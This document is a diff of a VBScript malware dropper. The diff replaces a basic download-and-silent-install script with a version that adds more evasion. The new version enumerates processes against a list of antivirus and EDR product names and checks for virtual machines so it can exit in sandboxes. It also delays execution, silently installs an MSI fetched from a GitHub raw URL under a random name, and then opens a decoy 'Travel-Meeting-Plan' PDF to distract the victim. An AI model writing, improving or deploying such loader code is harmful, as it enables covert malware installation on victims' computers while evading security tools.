@@ -1,27 +1,95 @@
-Dim url, tempPath, http, stream, wsh, rc
-Set wsh = CreateObject("WScript.Shell")
-tempPath = wsh.ExpandEnvironmentStrings("%TEMP%") & "\setup.msi"
-url = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
+Dim fso, sh, temp, stateFile, avFound, isVM, wmi, procs, cs
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set sh  = CreateObject("WScript.Shell")
+temp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Temp\"
+stateFile = temp & "value.txt"
 
+avFound = ""
+isVM = False
 On Error Resume Next
-Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-http.Open "GET", url, False
-http.Send
-On Error GoTo 0
 
-If http.Status = 200 Then
-    On Error Resume Next
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1
-    stream.Open
-    stream.Write http.ResponseBody
-    stream.SaveToFile tempPath, 2
-    stream.Close
-    On Error GoTo 0
+Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
 
-    If wsh.ExpandEnvironmentStrings("%TEMP%") <> "" Then
-        If CreateObject("Scripting.FileSystemObject").FileExists(tempPath) Then
-            wsh.Run "msiexec.exe /i """ & tempPath & """ /qn /norestart", 0, True
-        End If
+avList = "avp|avgnt|avguard|ekrn|bdagent|ccSvcHst|mbamservice|NortonSecurity|V3Svc|SAVService|McAfeeFramework|MsMpEng|avast|avgsvc|Sophos|SentinelOne|Cylance|CrowdStrike|CSFalcon|Panda|BullGuard|ESET"
+
+Set re = New RegExp
+re.Pattern = avList
+re.IgnoreCase = True
+
+For Each p In procs
+    If re.Test(p.Name) Then avFound = avFound & p.Name & ","
+Next
+
+Set cs = wmi.ExecQuery("SELECT Model, TotalPhysicalMemory, NumberOfProcessors FROM Win32_ComputerSystem")
+For Each c In cs
+    m = LCase(c.Model)
+    If InStr(m, "virtual") > 0 Or InStr(m, "vmware") > 0 Or _
+       InStr(m, "vbox") > 0 Or InStr(m, "qemu") > 0 Or InStr(m, "xen") > 0 Then
+        isVM = True
     End If
+    ram = c.TotalPhysicalMemory
+Next
+
+Dim f
+Set f = fso.CreateTextFile(stateFile, True)
+f.WriteLine "sandbox=" & isVM
+f.WriteLine "ram=" & ram
+f.WriteLine "av=" & avFound
+f.WriteLine "ts=" & Now
+f.Close
+
+If isVM Then
+    Set f = fso.OpenTextFile(stateFile, 8)
+    f.WriteLine "state=sandbox-exit"
+    f.Close
+Else
+    sh.Run "%COMSPEC% /c timeout /t 45 /nobreak >nul", 0, True
+
+    Dim http, msiUrl, msiPath, guid
+    msiUrl = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
+    guid   = CreateObject("Scriptlet.TypeLib").GUID
+    guid   = Replace(Replace(guid, "{", ""), "}", "")
+    msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & guid & ".msi"
+
+    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    http.open "GET", msiUrl, False
+    http.setRequestHeader "User-Agent", "Mozilla/5.0"
+    http.send
+
+    If http.status = 200 Then
+        Dim stream
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.responseBody
+        stream.SaveToFile msiPath, 2
+        stream.Close
+
+        sh.Run "msiexec.exe /i """ & msiPath & """ /qn /norestart", 0, False
+    End If
+
+    sh.Run "%COMSPEC% /c timeout /t 20 /nobreak >nul", 0, True
+    Dim pdfHttp, pdfUrl, pdfPath, pstream
+    pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
+    pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
+
+    Set pdfHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    pdfHttp.open "GET", pdfUrl, False
+    pdfHttp.setRequestHeader "User-Agent", "Mozilla/5.0"
+    pdfHttp.send
+
+    If pdfHttp.status = 200 Then
+        Set pstream = CreateObject("ADODB.Stream")
+        pstream.Type = 1
+        pstream.Open
+        pstream.Write pdfHttp.responseBody
+        pstream.SaveToFile pdfPath, 2
+        pstream.Close
+        sh.Run "msedge.exe """ & pdfPath & """", 1, False
+    End If
+
+    Set f = fso.OpenTextFile(stateFile, 8)
+    f.WriteLine "state=ok"
+    f.Close
 End If
